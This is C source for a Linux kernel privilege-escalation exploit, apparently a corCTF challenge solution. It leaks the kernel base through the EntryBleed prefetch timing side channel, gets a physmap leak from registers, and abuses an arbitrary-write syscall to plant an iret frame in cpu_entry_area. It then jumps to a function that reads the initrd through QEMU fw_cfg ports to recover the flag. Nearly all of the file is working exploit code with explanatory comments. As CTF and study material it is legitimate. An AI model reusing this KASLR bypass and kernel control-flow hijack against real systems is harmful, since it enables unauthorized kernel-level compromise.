#include <stddef.h>
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/sendfile.h>
#include <sys/io.h>

// commands
#define DEV_PATH "" // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

#define WAIT getc(stdin);
#define ulong unsigned long

#define errExit(msg)                                                           \
    do {                                                                       \
        perror(msg);                                                           \
        exit(EXIT_FAILURE);                                                    \
    } while (0)
#define KMALLOC(qid, msgbuf, N)                                                \
    for (int ix = 0; ix != N; ++ix) {                                          \
        if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1)        \
            errExit("KMALLOC");                                                \
    }

static void print_hex8(char *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

struct pt_regs {
    ulong r15;
    ulong r14;
    ulong r13;
    ulong r12;
    ulong bp;
    ulong bx;
    ulong r11;
    ulong r10;
    ulong r9;
    ulong r8;
    ulong ax;
    ulong cx;
    ulong dx;
    ulong si;
    ulong di;
    ulong orig_ax;
    ulong ip;
    ulong cs;
    ulong flags;
    ulong sp;
    ulong ss;
};

static void print_regs(struct pt_regs *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

int64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

int open_dev(void) {
    int fd = open("/dev/giraffe", O_RDWR);
    if (fd < 0) {
        errExit("open");
    }

    return fd;
}

/*
Entrybleed attack:
- prefetch = load byte from memory to location in cache hierachy
prefetch will finish quickly if address being loaded is already in TLB and finish
slower if it isn't (due to page table walk having to be done)
- KPTI = Kernel page table isolation. Kernel has all of userspace virtual memory
mapped. Userspace only minimal amount of kernel virtual memory, like exception/syscall
entry handlers and anything else necessary for the user to kernel transition.

Entrybleed issue: `entry_SYSCALL_64` symbol which is at a constant offset of KASLR,
is loaded into a LSTAR MST register inside `syscall_init` function, which gets executed
**before** switching to kernel. Therefore it is mapped in userspace and loaded into
TLB.

Why is TLB not invalidated when switching to kernel ? Because `global` bit is
set on PTE
    - global bit: tells the processor not to invalidate the TLB entry corresponding to the page upon a MOV to CR3 instruction.
    - global bit disabled for all pages except the ones being mapped in both user and kernel space:
        "global pages are disabled for all kernel structures not mapped into both kernel and userspace page tables"

Overall idea: repeatedly execute syscalls to ensure that the page with entry_SYSCALL_64
    (hence the name EntryBleed) gets cached in the instruction TLB, and then prefetch side-channel
    the possible range of addresses for that handler (as the kernel itself is guaranteed to be within 0xffffffff80000000 - 0xffffffffc0000000).


*/
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define PHYSMAP_BOTTOM 0xffff888000000000ull
#define PHYSMAP_TOP 0xffffc88000000000ull

// step size probably based on kernel alignment such that 0x1000 wouldnt make sense
#define STEP 0x100000ull

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP


uint64_t prefetch_leak(uint64_t start, uint64_t end, uint64_t step)
{
    uint64_t size = (end - start) / step;
    uint64_t *data = calloc(size, sizeof(uint64_t));
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < size; idx++)
        {
            uint64_t test = start + idx * step;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < size; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = start + i * step;
        }
    }

    return addr;
}

void corcrash(uint64_t addr, uint64_t val) {
    syscall(470, addr, val);
}

#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
// Virt: 0xfffffe0000001000 -> Phys: 0x7dc0a000
// => physmap offset is the same since 1:1 physical memory mapping
// => by leaking physmap we can leak cpu_entry_area
#define CPU_ENTRY_AREA_PHYS_ADDR 0x7dc0a000
// swapgs; sysret
// SWAPGS exchanges the current GS base register value with the value contained
// in MSR address C0000102H
#define SWAPGS_SYSRET		0x1ba
// restore iretframe from pt_regs struct pointed to by rdi we pass
// then jump to swapgs; iretq
#define SWAPGS_RESTORE	0xf42

void handle(int s) {}

#define INITRD_SIZE        1500000
char* initrd;
#define FW_CFG_PORT_SEL     0x510
#define FW_CFG_PORT_DATA    0x511
#define FW_CFG_INITRD_DATA  0x12
void win() {
    // fw_cfg is a QEMU-provided firmware configuration interface that lets
    // the guest (BIOS, bootloader, kernel) read data supplied by the hypervisor.
    // can read initial ramdisk like this
	while(1) {}
	outw(FW_CFG_INITRD_DATA, FW_CFG_PORT_SEL);

	for (int i=0; i<INITRD_SIZE; i++)
		initrd[i] = inb(FW_CFG_PORT_DATA);

	int fd = open("/tmp/initrd.gz", O_RDWR);
	write(fd, initrd, INITRD_SIZE);
	system("gzip -d /tmp/initrd.gz && cat /tmp/initrd | grep corctf{");

	while(1) {}
}

void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    // continue to next instruction
    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

uint64_t saved_rbp;
int main(int argc, char** argv) {
    uint64_t kbase = prefetch_leak(KERNEL_LOWER_BOUND, KERNEL_UPPER_BOUND, STEP);
    uint64_t init_cred = kbase + 0x10611a0;
    uint64_t cur_task = kbase + 0x171f018;
    uint64_t swapgs_sysret = kbase+SWAPGS_SYSRET;
    uint64_t swapgs_restore = kbase+SWAPGS_RESTORE;

    info("Leak: %p \n", kbase);
    info("Swapgs gadget1: %p \n", swapgs_sysret);
    info("Swapgs gadget2: %p \n", swapgs_restore);

    struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

	system("touch /tmp/initrd.gz");

    if (argc == 1) {
        // Perform an “early” ret2user without clearing registers from kernel leaks,
        // with enough luck one of them will contain a physmap leak.
        //
        // To return to userland use syscall_return_via_sysret routine, which
        // terminates with swapgs; nop; sysretq.
        //
        // Given that kpti is off, there’s nothing else we need to do to complete the context switch.
        // Since rcx will be set to 0, which is a valid canonical address, this allows
        // us to return to userland and catch the segfault (because 0 is an invalid instruction pointer)
        // to leak the content of the registers.
        //
        // physmap leaked in r14
        corcrash(swapgs_sysret, 0);
    }
    else {
        char* end = NULL;
        uint64_t physmap = strtoull(argv[1], &end, 0x10) - 0x1052700;

        info("Physmap: %p \n", physmap);
        uint64_t cpu_entry_area = physmap + CPU_ENTRY_AREA_PHYS_ADDR;
        //uint64_t cpu_entry_area = CPU_ENTRY_AREA_BASE(0);
        info("Cpu_entry_area: %p \n", cpu_entry_area);
        uint64_t payload_loc = cpu_entry_area+0x9f58;
        info("Payload location: %p \n", payload_loc);

        initrd = mmap(NULL, INITRD_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

        info("Win function: %p \n", &win);

        __asm__ __volatile__("mov %%rbp, %0" : "=r"(saved_rbp));
        // write iretframe to current stack and cause exception.
        // iretframe should then be at `payload_loc` in cpu_entry_area
        //
        // iretq always pops RIP, CS, RFLAGS; it **also** pops RSP, SS iff target
        // CS.RPL != current CPL (ring change)
        asm volatile(
            ".intel_syntax noprefix\n"
            // RIP
            "mov r15, %0\n"
            // CS
            "mov r14, 0x33\n"
            // RFLAGS value for iret
            //  0x0002 — bit 1 (always 1)
            //  0x0004 — PF set (not essential; often harmless)
            //  0x0200 — IF=1 (enable interrupts in user space)
            //  0x3000 — IOPL=3 (I/O privilege level).
            "mov r13, 0x3206\n"
            "mov r12, %1\n"
            "mov rbp, 0x2b\n"
            "mov rax, 0\n"
            // div by 0 causing exception
            "div rax\n"

            ".att_syntax prefix\n"
            :         // output
            : "r"(&win), "r"(&kbase) // inputs
            :
        );
        __asm__ __volatile__("mov %0, %%rbp" :: "r"(saved_rbp));

        // gadget will write iretframe to stack in the following way:
        // 0xffffffffbca00f42:  push   QWORD PTR [rdi+0x30]
        // 0xffffffffbca00f45:  push   QWORD PTR [rdi+0x28]
        // 0xffffffffbca00f48:  push   QWORD PTR [rdi+0x20]
        // 0xffffffffbca00f4b:  push   QWORD PTR [rdi+0x18]
        // 0xffffffffbca00f4e:  push   QWORD PTR [rdi+0x10]
        // 0xffffffffbca00f51:  push   QWORD PTR [rdi]
        corcrash(swapgs_restore, payload_loc);
    }
}